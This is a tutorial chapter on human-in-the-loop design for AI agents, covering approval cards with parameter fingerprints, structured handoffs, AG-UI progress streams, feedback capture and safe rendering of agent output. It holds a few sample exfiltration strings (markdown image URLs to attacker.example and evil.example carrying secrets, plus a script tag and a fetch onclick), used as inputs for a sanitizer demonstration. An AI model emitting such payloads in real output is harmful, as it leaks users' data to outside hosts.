# Chapter 44 — Human-in-the-loop UX

> Ch 26 built the **mechanics** of human-in-the-loop: pause, checkpoint, resume. This chapter is about the
> **human side**: what people see, what they click, and whether they catch the agent's mistakes or rubber-stamp
> them. A badly designed approval screen is a safety control that only exists on paper.

**You will learn:** the **autonomy ladder** and how agents earn trust; **approval UIs** that resist approval
fatigue, with approvals bound to exact parameters; **handoff to humans** with a structured object (`attempted`,
`confidence_flags`, evidence); **streaming and progress UIs** (with AG-UI events and interrupts); **showing
citations**; **feedback capture**, explicit and implicit; **trust calibration** (avoiding both over- and
under-trust); and **rendering agent output and agent-generated UI safely**.

**Where this fits:** builds on interrupts and checkpoints (Ch 26), citations and groundedness (Ch 07, 17), the
gateway's approval step (Ch 32), evals and the data flywheel (Ch 33), tracing (Ch 34), guardrails and output
exfiltration (Ch 35–36), voice escalation (Ch 42) and the UI standards map (AG-UI, A2UI, MCP Apps in Ch 28).
The FDE chapters (45–46) use these patterns in customer pilots.

> **Checked against:** the AG-UI repository docs (events and interrupts) and the `ag-ui-protocol` Python SDK
> 1.0.0, and the A2UI README (October 2026). All code in section 4 was run.

---

## 1. The idea in plain words

Humans meet an agent at five moments:

| Moment | The human needs | Chapter section |
|---|---|---|
| **Watching it work** | To know what it's doing, and to stop it | 3.4 streaming and progress |
| **Checking what it says** | To verify claims quickly | 3.5 citations |
| **Approving what it does** | To understand an action and its risk in seconds | 3.2 approval UIs |
| **Taking over** | The full picture without reading 40 messages | 3.3 handoff |
| **Correcting it** | A cheap way to say "wrong", which then makes the agent better | 3.6 feedback |

Across all of them runs one goal: **calibrated trust** (3.7). People should rely on the agent when it's
right and check it when it's likely wrong. Too much trust lets errors through; too little means nobody uses
it.

---

## 2. Analogy

**A new employee and their manager.** In week one, the manager checks every email before it's sent. The new
hire writes short notes: "Here's what I did, here's what I'm unsure about." When they're stuck, they hand over
the case with a summary instead of saying "can you look at this?". The manager's corrections teach them. After
a few months of good work on routine cases, those stop needing sign-off, but big-money decisions still do.
Trust is earned **per type of task**, with evidence, and can be taken back.

---

## 3. How it works

### 3.1 The autonomy ladder

| Level | The agent… | The human… | Typical for |
|---|---|---|---|
| **0 Suggest** | Proposes; does nothing | Does the work | New deployments, regulated decisions |
| **1 Draft** | Prepares the action or reply | Approves or edits **each** one | Customer emails, refunds in a pilot |
| **2 Act with gates** | Acts on low-risk items; asks on risky ones | Approves by **policy** (amount, reversibility, customer tier) | Most production agents |
| **3 Act and audit** | Acts | Reviews a **sample** after the fact | Mature, high-volume, reversible actions |
| **4 Autonomous** | Acts | Watches dashboards and alerts | Narrow, well-measured tasks |

Move up a level **per action type** using numbers, not feelings. For example: "Refunds under $50 move from level
1 to level 2 after 200 consecutive approvals with no edits and zero severe errors." Move down automatically
after an incident. The ladder is also your best sales tool as an FDE: customers say yes to level 1 much faster
than to level 4 (Ch 45).

### 3.2 Approval UIs

A good approval card answers **"what, why, how risky, can I undo it?"** in about five seconds:

```
[HUMAN] refund {"order": "A-1043", "amount": 120.0}
  why: Item arrived damaged (photo checked)
  evidence: ticket#8812, photo_check#51
  reversible: NO   expires in 60 min
  [Approve] [Edit] [Reject + reason] [Escalate]
```

- **The exact action and parameters**, readable, with a **diff** for edits to records, code or documents.
- **Why**: the agent's reason, plus **evidence one click away** (Ch 07).
- **Impact**: amount, number of recipients, reversible or not, which system.
- **Choices**: Approve, **Edit** (fix the amount instead of rejecting), **Reject with a reason** (the reason is
  feedback), Escalate.
- **Safe defaults**: expiry means rejection; the primary button is never the dangerous one on high-risk cards;
  for very high risk, require typing the amount or a second approver (**four-eyes rule**).

**Approval fatigue** is the main failure. If every step asks for approval, people click "Approve" without
reading. Signs: median decision time under ~2 seconds and an approval rate near 100%. Fixes: route by risk
(only ask where it matters), **batch** similar low-risk items ("approve these 12 refunds under $20"),
automate what's always approved, and keep cards short.

**Bind approval to parameters.** The human approved "refund $120 to A-1043". The tool layer must execute
*exactly that*, not whatever the model sends later. Hash the action and parameters when the card is shown and
re-check at execution (section 4.1). This closes a time-of-check/time-of-use gap that prompt injection could
otherwise exploit (Ch 36). Log who approved what, when, having seen which version.

### 3.3 Handoff to a human

**When to hand off:** low confidence; policy requires a human; the user asks for one (always honour this
quickly); repeated failure (the same step failed twice); an upset user; high value or high risk.

**What to hand over:** a structured object, not a transcript dump:

| Field | Purpose |
|---|---|
| `intent`, `summary` | What the user wants, in 2–3 sentences written for a human |
| **`attempted`** | What the agent already tried and what happened, so the human doesn't repeat it |
| **`confidence_flags`** | What the agent is *unsure* about and why: where the human should look first |
| `evidence` | Record IDs, citations, documents to open |
| `suggested_next_step` | The agent's best guess, clearly labelled as a suggestion |
| `reason`, `priority`, `queue` | Routing: the billing queue, the returns team, a supervisor |
| `trace_id` | One click to the full trace (Ch 34) |

The user should **never have to repeat themselves** after a handoff: that is the most common complaint about
bots. Tell the user what happens next and roughly when ("A returns specialist will reply within 2 hours").
After the human resolves it, their resolution is a labelled example for evals (3.6).

### 3.4 Streaming and progress UIs

- **Stream text** token by token (Ch 12); it's the difference between "fast" and "broken" for answers that take
  several seconds.
- **Stream steps, not just text**: "Searching orders… Found 1 order… Checking return policy…". Show *what* the
  agent is doing in human words, not raw reasoning. Hidden reasoning stays hidden; a short progress summary
  is enough.
- **Let people stop it**: a visible Stop button that actually cancels generation and pending tool calls
  (Ch 14).
- **Don't claim success early**: show "Refund requested" until the tool confirms, then "Refund issued".
- **Long tasks go async** (Ch 38): a job ID, a progress page and a notification when done or when input is
  needed.

**AG-UI** standardizes this agent → frontend stream. It defines event types for run lifecycle, text messages,
tool calls, state, activity, reasoning and sub-agents, sent over SSE, WebSockets or other transports. In
version 1.0 a run can end with an **interrupt** outcome: the agent pauses, the UI shows the request, and the
next run resumes with the human's decision. Interrupts have core reasons: `tool_call` (bound to a proposed tool
call), `input_required` and `confirmation`. They can carry a JSON Schema for the expected answer and an expiry.
That maps directly onto the approval card above (section 4.5).

### 3.5 Showing citations

Citations are how users check an agent *cheaply* (Ch 17):

- **Inline markers** ([1], [2]) next to the sentence they support, not a list of links at the end.
- **Hover or click to see the exact quote**, highlighted in the source document.
- **Verify before you show**: every quoted span must exist in the retrieved source (Ch 07's quote check).
  Unsupported sentences get visibly marked or removed.
- **Freshness and authority**: show document dates and owners ("HR policy, updated March 2026").
- **Say when there's no source**: "I couldn't find this in the policy documents" is a feature.

### 3.6 Feedback capture

| Signal | Kind | What it tells you |
|---|---|---|
| Thumbs up/down with a reason (wrong info, unhelpful, unsafe, tone) | Explicit | Direct quality; low volume |
| **Edits to drafts** before sending | Implicit, rich | Exactly what was wrong: the diff is a labelled example |
| Regenerate or retry | Implicit | The first answer wasn't good enough |
| Copy or use the answer | Implicit | Probably useful |
| Escalation to a human; abandonment | Implicit | Failure or missing capability |
| Approval edits and rejection reasons | Explicit | Policy and accuracy problems in actions |

Make feedback **cheap** (one click, an optional reason), **tie every event to a trace ID** (Ch 34), and run a
**weekly triage**: bad cases → root cause → new eval cases (Ch 33) → fix → measure. That loop is the data
flywheel. Close it with users ("Thanks, we fixed this") and they keep giving feedback. Feedback text can
contain PII, so treat it like the conversation itself (Ch 36).

### 3.7 Trust calibration

The goal is **calibrated** trust, not maximum trust. Measure it with a sampled audit: for N decisions, record
whether the user accepted the agent's output and whether it was actually correct.

- **Over-trust (automation bias)**: accepted but wrong. People stopped checking. Fixes: show uncertainty
  (`confidence_flags`), make evidence one click away, add friction where errors are costly, and spot-check.
- **Under-trust**: rejected but right. People redo work the agent did well. Fixes: show evidence, behave
  consistently, explain scope ("I can check orders and start returns; I can't change prices"), build a track
  record visible per task type.

Show uncertainty **honestly and specifically** ("I couldn't confirm the delivery date"). A made-up "87%
confident" teaches users nothing, because model confidence numbers are not calibrated probabilities. Don't use
human-like tricks (fake typing delays, "As your friend…") that make people trust the agent more than its
accuracy deserves.

### 3.8 Rendering agent output and agent-generated UI safely

The model's output is **untrusted input to your frontend**:

- **Raw HTML/JS** from the model → cross-site scripting. Never render it directly.
- **Markdown images** load automatically. `![x](https://attacker.example/p.png?d=SECRET)` sends data out the
  moment it renders: the classic exfiltration channel (Ch 36). Allowlist image and link domains, or strip
  them.
- **Links** can be phishing. Show the real domain, and allowlist where possible.

When agents return **UI** (forms, cards, tables, buttons), use one of these:

| Approach | How it stays safe |
|---|---|
| **Declarative UI from a trusted catalog** (the A2UI idea) | The agent sends JSON naming components (Card, Button, TextField) and data; the client renders **its own** pre-approved components. No agent code runs |
| **MCP Apps** | A tool declares a `ui://` resource; the host renders it in a **sandboxed iframe** and brokers its tool calls |
| **Sanitized markdown** | A real sanitizer (DOMPurify in the browser, nh3 in Python) with a domain allowlist |
| **AG-UI** | Transport for events and state; the frontend still decides how to render them |

Buttons in agent UI should trigger **named actions** your backend validates (`approve_8812`), never arbitrary
URLs or code.

### 3.9 Accessibility and inclusion

Streaming text must work with screen readers (announce updates politely, not every token), approval cards
must be keyboard-navigable, language should be plain, and the agent should work in the user's language. Voice
(Ch 42) is itself an accessibility channel.

---

## 4. Code

```bash
pip install pydantic ag-ui-protocol       # everything below runs offline
```

### 4.1 Risk-based approvals, bound to exact parameters

```python
# approvals.py — risk-based approval routing, and "what you approved is exactly what runs"
import hashlib
import json
import time
from dataclasses import dataclass, field

def fingerprint(action, params):
    return hashlib.sha256(json.dumps({"action": action, "params": params}, sort_keys=True).encode()).hexdigest()[:16]

def route(action, params):
    """Ask humans only where it matters: approval fatigue turns every gate into a rubber stamp."""
    amount = params.get("amount", 0)
    if action in {"delete_account", "bulk_email"} or amount > 500:
        return "two_person"                     # four-eyes rule for high-impact actions
    if action.startswith(("refund", "send", "update")) and amount > 50:
        return "human"
    return "auto"

@dataclass
class ApprovalRequest:
    action: str
    params: dict
    reason: str                                 # the agent's justification, shown on the card
    evidence: list                              # links/citations the reviewer can check in one click
    reversible: bool
    ttl_s: int = 3600
    created: float = field(default_factory=time.time)
    approvals: list = field(default_factory=list)

    @property
    def fp(self):
        return fingerprint(self.action, self.params)

    def card(self):
        return (f"[{route(self.action, self.params).upper()}] {self.action} {json.dumps(self.params)}\n"
                f"  why: {self.reason}\n  evidence: {', '.join(self.evidence)}\n"
                f"  reversible: {'yes' if self.reversible else 'NO'}   expires in {self.ttl_s // 60} min\n"
                f"  [Approve] [Edit] [Reject + reason] [Escalate]")

    def approve(self, reviewer, seen_fp):
        if seen_fp != self.fp:
            raise ValueError("card changed since the reviewer saw it")
        if reviewer not in self.approvals:
            self.approvals.append(reviewer)

def execute(req: ApprovalRequest, action, params, now=None):
    """Called by the TOOL layer, not the model. Re-checks everything at execution time."""
    needed = {"auto": 0, "human": 1, "two_person": 2}[route(action, params)]
    if fingerprint(action, params) != req.fp:
        return "REFUSED: parameters differ from what was approved"
    if (now or time.time()) > req.created + req.ttl_s:
        return "REFUSED: approval expired (expired means rejected)"
    if len(req.approvals) < needed:
        return f"WAITING: {len(req.approvals)}/{needed} approvals"
    return f"EXECUTED {action} {params} approved by {req.approvals or ['policy:auto']}"

if __name__ == "__main__":
    req = ApprovalRequest("refund", {"order": "A-1043", "amount": 120.0}, reason="Item arrived damaged (photo checked)",
                          evidence=["ticket#8812", "photo_check#51"], reversible=False)
    print(req.card())
    print(execute(req, "refund", {"order": "A-1043", "amount": 120.0}))
    req.approve("maria", seen_fp=req.fp)
    print(execute(req, "refund", {"order": "A-1043", "amount": 1200.0}))     # model changed the amount later
    print(execute(req, "refund", {"order": "A-1043", "amount": 120.0}))
    print(execute(req, "refund", {"order": "A-1043", "amount": 120.0}, now=time.time() + 7200))
    small = ApprovalRequest("refund", {"order": "B-7", "amount": 12.0}, "duplicate charge", ["ticket#9"], True)
    print(execute(small, "refund", {"order": "B-7", "amount": 12.0}))
```

Output:

```text
[HUMAN] refund {"order": "A-1043", "amount": 120.0}
  why: Item arrived damaged (photo checked)
  evidence: ticket#8812, photo_check#51
  reversible: NO   expires in 60 min
  [Approve] [Edit] [Reject + reason] [Escalate]
WAITING: 0/1 approvals
REFUSED: parameters differ from what was approved
EXECUTED refund {'order': 'A-1043', 'amount': 120.0} approved by ['maria']
REFUSED: approval expired (expired means rejected)
EXECUTED refund {'order': 'B-7', 'amount': 12.0} approved by ['policy:auto']
```

The second line matters most: the reviewer approved $120, the model later sent $1,200, and the tool layer
refused. In LangGraph this sits around the `interrupt()` from Ch 26: the interrupt payload is the card, and
the resumed command carries the decision and the fingerprint the reviewer saw.

### 4.2 A structured handoff

```python
# handoff.py — escalate to a human WITH context, so nobody re-reads the transcript and the user never repeats themselves
from typing import Literal
from pydantic import BaseModel, Field

class Attempt(BaseModel):
    step: str                       # what the agent tried
    result: str                     # what happened

class Handoff(BaseModel):
    trace_id: str                   # one click to the full trace (Ch 34)
    user: str
    intent: str                     # what the user wants, in one line
    summary: str                    # 2-3 sentences, written for the human, not for the model
    attempted: list[Attempt]        # what was already tried, so the human doesn't repeat it
    confidence_flags: list[str]     # what the agent is UNSURE about, and why
    evidence: list[str] = []        # citations / record IDs the human can open
    suggested_next_step: str = ""
    reason: Literal["low_confidence", "policy", "user_asked", "repeated_failure", "upset_user", "high_value"]
    priority: Literal["low", "normal", "high"] = "normal"
    queue: str = Field(default="general", description="skill-based routing: billing, returns, tech, ...")

def render(h: Handoff) -> str:
    lines = [f"[{h.priority.upper()}] {h.queue} · {h.reason} · trace {h.trace_id}",
             f"User: {h.user} — wants: {h.intent}", f"Summary: {h.summary}", "Already tried:"]
    lines += [f"  - {a.step} → {a.result}" for a in h.attempted]
    lines += ["Agent is unsure about:"] + [f"  ! {f}" for f in h.confidence_flags]
    if h.suggested_next_step:
        lines.append(f"Suggested next step: {h.suggested_next_step}")
    return "\n".join(lines)

if __name__ == "__main__":
    h = Handoff(
        trace_id="tr_7f3a", user="Dana Lee (cust 5521)", intent="refund for a damaged lamp, order A-1043",
        summary="Lamp arrived with a cracked base. Order is 41 days old; the return window is 30 days.",
        attempted=[Attempt(step="lookup_order(A-1043)", result="delivered 41 days ago, $120"),
                   Attempt(step="check_policy(returns)", result="30-day window; exceptions need a supervisor")],
        confidence_flags=["Photo shows damage but I can't tell if it happened in shipping or later",
                          "Customer says they reported it on day 3; I found no earlier ticket"],
        evidence=["order:A-1043", "policy:returns#exceptions", "photo:upl_93"],
        suggested_next_step="Supervisor decides on an exception refund or store credit",
        reason="policy", priority="normal", queue="returns")
    print(render(h))
```

Output:

```text
[NORMAL] returns · policy · trace tr_7f3a
User: Dana Lee (cust 5521) — wants: refund for a damaged lamp, order A-1043
Summary: Lamp arrived with a cracked base. Order is 41 days old; the return window is 30 days.
Already tried:
  - lookup_order(A-1043) → delivered 41 days ago, $120
  - check_policy(returns) → 30-day window; exceptions need a supervisor
Agent is unsure about:
  ! Photo shows damage but I can't tell if it happened in shipping or later
  ! Customer says they reported it on day 3; I found no earlier ticket
Suggested next step: Supervisor decides on an exception refund or store credit
```

Have the agent fill `Handoff` as structured output (Ch 10) when it decides to escalate. Validate it, then post
it to the queue (help desk, CRM, Slack).

### 4.3 Feedback signals and trust calibration

```python
# feedback.py — turn user signals into metrics and eval cases (the data flywheel, Ch 33-34)
import difflib
from collections import Counter

EVENTS = [  # what the UI logs, each tied to a trace_id
    {"trace": "t1", "kind": "thumbs", "value": "up"},
    {"trace": "t2", "kind": "thumbs", "value": "down", "reason": "wrong_info"},
    {"trace": "t3", "kind": "regenerate"},                         # implicit: first answer wasn't good enough
    {"trace": "t4", "kind": "draft_sent", "draft": "Hi Dana, your refund of $120 is approved.",
     "sent": "Hi Dana, your refund of $120 is approved and will arrive in 5 business days."},
    {"trace": "t5", "kind": "draft_sent", "draft": "Your order shipped Monday.", "sent": "Your order shipped Monday."},
    {"trace": "t6", "kind": "escalated"},
    {"trace": "t7", "kind": "copy"},                                # implicit: the user used the answer
]

def edit_ratio(draft, sent):
    """0 = sent as-is, 1 = completely rewritten. Edits to drafts are the richest feedback you'll get."""
    return round(1 - difflib.SequenceMatcher(None, draft, sent).ratio(), 2)

def summarize(events):
    kinds = Counter(e["kind"] for e in events)
    edits = [edit_ratio(e["draft"], e["sent"]) for e in events if e["kind"] == "draft_sent"]
    eval_candidates = [e["trace"] for e in events
                       if (e["kind"] == "thumbs" and e["value"] == "down") or e["kind"] in {"regenerate", "escalated"}
                       or (e["kind"] == "draft_sent" and edit_ratio(e["draft"], e["sent"]) > 0.2)]
    return {"counts": dict(kinds), "draft_edit_ratios": edits, "to_triage_as_eval_cases": eval_candidates}

def trust_calibration(audits):
    """audits: (user_accepted, actually_correct) from a sampled human audit. Calibrated trust = both errors low."""
    accepted_wrong = sum(1 for a, c in audits if a and not c)
    rejected_right = sum(1 for a, c in audits if not a and c)
    acc = sum(1 for a, _ in audits if a) or 1
    rej = sum(1 for a, _ in audits if not a) or 1
    return {"overtrust (accepted but wrong)": f"{accepted_wrong / acc:.0%}",
            "undertrust (rejected but right)": f"{rejected_right / rej:.0%}"}

if __name__ == "__main__":
    print(summarize(EVENTS))
    audits = [(True, True)] * 80 + [(True, False)] * 8 + [(False, True)] * 6 + [(False, False)] * 6
    print(trust_calibration(audits))
```

Output:

```text
{'counts': {'thumbs': 2, 'regenerate': 1, 'draft_sent': 2, 'escalated': 1, 'copy': 1}, 'draft_edit_ratios': [0.3, 0.0], 'to_triage_as_eval_cases': ['t2', 't3', 't4', 't6']}
{'overtrust (accepted but wrong)': '9%', 'undertrust (rejected but right)': '50%'}
```

Read the second line as a product decision. 9% of accepted answers were wrong, so users need easier
verification on the error-prone task types. Half of the rejections were of correct answers, so users don't
yet trust the agent where it's actually good; show evidence there.

### 4.4 Render safely: sanitized markdown and a component catalog

```python
# safe_render.py — the model's output is untrusted: sanitize markdown, and render UI only from a trusted catalog
import re
from urllib.parse import urlparse

ALLOWED_HOSTS = {"docs.acme.com", "cdn.acme.com"}

def _ok(url):
    u = urlparse(url)
    return u.scheme == "https" and u.hostname in ALLOWED_HOSTS

def sanitize_markdown(md):
    md = re.sub(r"<[^>]+>", "", md)                                       # no raw HTML (<script>, <img onerror=...>)
    # images load AUTOMATICALLY when rendered: a non-allowlisted image URL can carry data out (Ch 36)
    md = re.sub(r"!\[([^\]]*)\]\(([^)\s]+)[^)]*\)", lambda m: m.group(0) if _ok(m.group(2)) else f"[image removed: {m.group(1)}]", md)
    md = re.sub(r"(?<!!)\[([^\]]+)\]\(([^)\s]+)[^)]*\)", lambda m: m.group(0) if _ok(m.group(2)) else m.group(1), md)
    return md

# declarative UI (the A2UI idea): the agent asks for components BY NAME; the client renders its own trusted widgets
CATALOG = {
    "Card":      {"title": str, "body": str},
    "Button":    {"label": str, "action_id": str},
    "TextField": {"label": str, "field_id": str},
    "Table":     {"columns": list, "rows": list},
}

def validate_ui(components):
    errors = []
    for i, c in enumerate(components):
        spec = CATALOG.get(c.get("type"))
        if spec is None:
            errors.append(f"#{i}: component '{c.get('type')}' not in catalog")
            continue
        for key, value in c.get("props", {}).items():
            if key not in spec:
                errors.append(f"#{i} {c['type']}: unknown prop '{key}'")
            elif not isinstance(value, spec[key]):
                errors.append(f"#{i} {c['type']}: prop '{key}' should be {spec[key].__name__}")
    return errors or ["ok"]

if __name__ == "__main__":
    reply = ("See the [returns policy](https://docs.acme.com/returns) and [this page](https://evil.example/x). "
             "![chart](https://evil.example/p.png?d=card_ending_1881) <script>steal()</script>")
    print(sanitize_markdown(reply))
    print(validate_ui([{"type": "Card", "props": {"title": "Refund", "body": "$120 to card ending 1881"}},
                       {"type": "Button", "props": {"label": "Approve", "action_id": "approve_8812"}}]))
    print(validate_ui([{"type": "HtmlBlock", "props": {"html": "<iframe src=...>"}},
                       {"type": "Button", "props": {"label": "Pay", "onclick": "fetch('//evil')"}}]))
```

Output:

```text
See the [returns policy](https://docs.acme.com/returns) and this page. [image removed: chart] steal()
['ok']
["#0: component 'HtmlBlock' not in catalog", "#1 Button: unknown prop 'onclick'"]
```

The exfiltration image and script are gone; the allowlisted link survives. The regexes keep the idea visible.
In production, use a real markdown parser and HTML sanitizer, plus a Content-Security-Policy as a backstop.

### 4.5 Stream progress and an approval interrupt with AG-UI

```python
# progress_stream.py — stream what the agent is DOING to the UI as AG-UI events (pip install ag-ui-protocol)
from ag_ui.core import (Interrupt, RunFinishedEvent, RunFinishedInterruptOutcome, RunStartedEvent, StepFinishedEvent,
                        StepStartedEvent, TextMessageContentEvent, TextMessageEndEvent, TextMessageStartEvent,
                        ToolCallArgsEvent, ToolCallEndEvent, ToolCallResultEvent, ToolCallStartEvent)
from ag_ui.encoder import EventEncoder

def run_events(thread_id="th_1", run_id="run_1"):
    """One agent run: look up the order, explain, then PAUSE for approval of the refund (an interrupt)."""
    yield RunStartedEvent(thread_id=thread_id, run_id=run_id)
    yield StepStartedEvent(step_name="Looking up your order")                 # progress the user can read
    yield ToolCallStartEvent(tool_call_id="tc_1", tool_call_name="lookup_order")
    yield ToolCallArgsEvent(tool_call_id="tc_1", delta='{"order": "A-1043"}')
    yield ToolCallEndEvent(tool_call_id="tc_1")
    yield ToolCallResultEvent(message_id="m_tool", tool_call_id="tc_1", content='{"status": "delivered", "total": 120}')
    yield StepFinishedEvent(step_name="Looking up your order")
    yield TextMessageStartEvent(message_id="m_1", role="assistant")
    for chunk in ["Your order was delivered. ", "I can refund $120 — ", "a teammate needs to approve it first."]:
        yield TextMessageContentEvent(message_id="m_1", delta=chunk)           # token streaming
    yield TextMessageEndEvent(message_id="m_1")
    # the agent PROPOSES a write; there is no result yet, because a human must decide
    yield ToolCallStartEvent(tool_call_id="tc_2", tool_call_name="refund")
    yield ToolCallArgsEvent(tool_call_id="tc_2", delta='{"order": "A-1043", "amount": 120}')
    yield ToolCallEndEvent(tool_call_id="tc_2")
    yield RunFinishedEvent(thread_id=thread_id, run_id=run_id, outcome=RunFinishedInterruptOutcome(
        type="interrupt",
        interrupts=[Interrupt(id="int_1", reason="tool_call", tool_call_id="tc_2",      # core reason: bound to tc_2
                              message="Refund $120 to order A-1043?", expires_at="2026-10-12T18:00:00Z",
                              response_schema={"type": "object", "properties": {
                                  "decision": {"enum": ["approve", "edit", "reject"]}, "amount": {"type": "number"}},
                                  "required": ["decision"]})]))

if __name__ == "__main__":
    enc = EventEncoder()                                                        # Server-Sent Events framing
    for event in run_events():
        print(enc.encode(event), end="")
```

Output (Server-Sent Events, shortened):

```text
data: {"type":"RUN_STARTED","threadId":"th_1","runId":"run_1"}
data: {"type":"STEP_STARTED","stepName":"Looking up your order"}
data: {"type":"TOOL_CALL_START","toolCallId":"tc_1","toolCallName":"lookup_order"}
...
data: {"type":"TEXT_MESSAGE_CONTENT","messageId":"m_1","delta":"Your order was delivered. "}
...
data: {"type":"TOOL_CALL_START","toolCallId":"tc_2","toolCallName":"refund"}
data: {"type":"TOOL_CALL_ARGS","toolCallId":"tc_2","delta":"{\"order\": \"A-1043\", \"amount\": 120}"}
data: {"type":"TOOL_CALL_END","toolCallId":"tc_2"}
data: {"type":"RUN_FINISHED","threadId":"th_1","runId":"run_1","outcome":{"type":"interrupt","interrupts":[{"id":"int_1","reason":"tool_call","message":"Refund $120 to order A-1043?","toolCallId":"tc_2","responseSchema":{...},"expiresAt":"2026-10-12T18:00:00Z"}]}}
```

Serve this from the Ch 38 FastAPI service as an SSE endpoint. The frontend renders the step as a progress line,
streams the text, and turns the interrupt into the approval card from 4.1. Its decision comes back in the next
run's `resume` input.

---

## 5. Production view

| Concern | What to do |
|---|---|
| **Autonomy** | Per-action-type levels with numeric promotion criteria; automatic demotion on incidents |
| **Approvals** | Risk routing; batching; parameter binding (fingerprints); expiry = reject; four-eyes for high impact; audit log |
| **Fatigue** | Track decision time and approval rate per gate; remove or automate gates that are always approved |
| **Handoff** | Structured object; skill-based queues; user told what happens next; resolution captured as a label |
| **Progress** | Stream text and steps; working Stop button; async jobs with notifications for long runs |
| **Citations** | Inline, quote-verified, dated; explicit "no source found" |
| **Feedback** | One-click capture tied to trace IDs; weekly triage into eval cases; draft edit diffs stored |
| **Trust** | Sampled audits measuring over- and under-trust per task type; honest, specific uncertainty |
| **Rendering** | Sanitizer + domain allowlist + CSP; declarative UI from a trusted catalog; named actions only |
| **Accessibility** | Screen-reader-friendly streaming; keyboard-accessible approvals; plain language |

---

## 6. Common mistakes

- Asking for approval on every step, then wondering why reviewers approve a bad action in one second.
- Approval cards that show JSON blobs without the reason, the evidence or reversibility.
- Approving one thing and executing another: no parameter binding.
- Handoffs that say "please see transcript", so the human starts from zero and the user repeats everything.
- Showing a fake confidence percentage.
- Rendering model markdown with images enabled from any domain.
- Collecting thumbs-down clicks that nobody ever reads.
- Showing "Done!" before the tool confirmed it.

---

## 7. Practice

**Level 1**
1. Run `approvals.py`. Add a rule: refunds to accounts younger than 7 days always need a human, whatever the
   amount.
2. Run `safe_render.py` with three new attack strings: a `javascript:` link, an image on an allowed domain with
   a query string, and an HTML entity-encoded `<script>`. Which get through? Should they?

**Level 2**
3. Add `Handoff` to your Ch 14 agent as an `escalate` tool with structured output. Write 10 conversations that
   should escalate; score how often `attempted` and `confidence_flags` are accurate.
4. Build a small web page (any framework) that consumes `progress_stream.py` over SSE, shows the steps, streams
   the text, and turns the interrupt into an approval card.

**Level 3**
5. Run a two-week "trust study" in your capstone: log feedback signals and audit 100 decisions. Report over- and
   under-trust per task type, then make one UI change per finding and measure again.

---

## 8. Check yourself

1. What are the five autonomy levels, and how does an action type move between them?
2. What should an approval card show, and how do you detect approval fatigue?
3. Why bind approvals to a fingerprint of the parameters?
4. What do `attempted` and `confidence_flags` contribute to a handoff?
5. Which implicit feedback signal is usually richest, and why?
6. Define over-trust and under-trust, and give one fix for each.
7. Why can rendering markdown images leak data, and what are the safe options for agent-generated UI?
8. How does AG-UI represent "the agent paused for approval"?

<details>
<summary>Answers</summary>

1. Suggest → draft (approve each) → act with policy gates → act and audit samples → autonomous with monitoring.
   Promotion per action type on numeric criteria (e.g. N approvals without edits, zero severe errors);
   automatic demotion after incidents.
2. The exact action and parameters (a diff for edits), the reason, evidence links, impact, reversibility, an
   expiry, and approve/edit/reject/escalate. Fatigue shows as very short decision times and an approval rate
   near 100%.
3. So that what executes is exactly what the human saw and approved. A model, or an injection, can't change
   the amount or target after approval.
4. `attempted` stops the human repeating work already done; `confidence_flags` tells them where to look first
   and why the agent escalated.
5. Edits to drafts: the diff between the draft and what was sent shows exactly what was wrong, and it's
   effectively a labelled example.
6. Over-trust: users accept wrong outputs; fix with visible uncertainty, one-click evidence, friction on costly
   actions. Under-trust: users reject correct outputs; fix with evidence, consistency, clear scope and a
   visible track record.
7. Images load automatically, so a URL can carry secrets to an attacker's server. Safe options: sanitized
   markdown with a domain allowlist, declarative UI from a trusted component catalog (A2UI-style), sandboxed
   MCP Apps, and named actions validated by the backend.
8. The run ends with `RUN_FINISHED` whose `outcome` is `{"type": "interrupt", "interrupts": [...]}`. Each
   interrupt has an id, a reason (e.g. `tool_call` bound to a `toolCallId`), a message, and optionally a
   response schema and expiry. The next run resumes with the decision.

</details>

---

## 9. Key terms

**human-in-the-loop (HITL)** · **autonomy ladder** · **approval card** · **approval fatigue** · **four-eyes
rule** · **parameter binding / fingerprint** · **expiry = reject** · **handoff** · **`attempted`** ·
**`confidence_flags`** · **warm handoff** · **streaming progress** · **AG-UI events / interrupts** · **inline
citations** · **explicit vs implicit feedback** · **draft edit ratio** · **data flywheel** · **calibrated
trust** · **automation bias** · **declarative UI / component catalog (A2UI)** · **MCP Apps** · **markdown image
exfiltration**

Next: [Part 10 — Chapter 45: The FDE role →](../part10-fde/45-the-fde-role.md)
